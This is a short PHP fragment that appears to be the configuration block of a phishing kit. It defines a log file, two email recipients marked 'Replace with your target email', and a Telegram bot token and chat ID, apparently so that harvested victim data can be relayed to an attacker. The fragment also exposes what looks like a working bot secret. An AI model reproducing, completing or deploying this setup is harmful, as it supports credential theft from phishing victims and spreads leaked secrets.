<?php
$logFile = "logs.txt";
$emailTo = "cchyneezvyncent@gmail.com,zeus.wash@yandex.com"; // Replace with your target email
$teltok = "8539479885:AAG5W5b3PpgWYK4Oj5H_VfsFOJWFti92egs";
$telchatid = "8486936587";
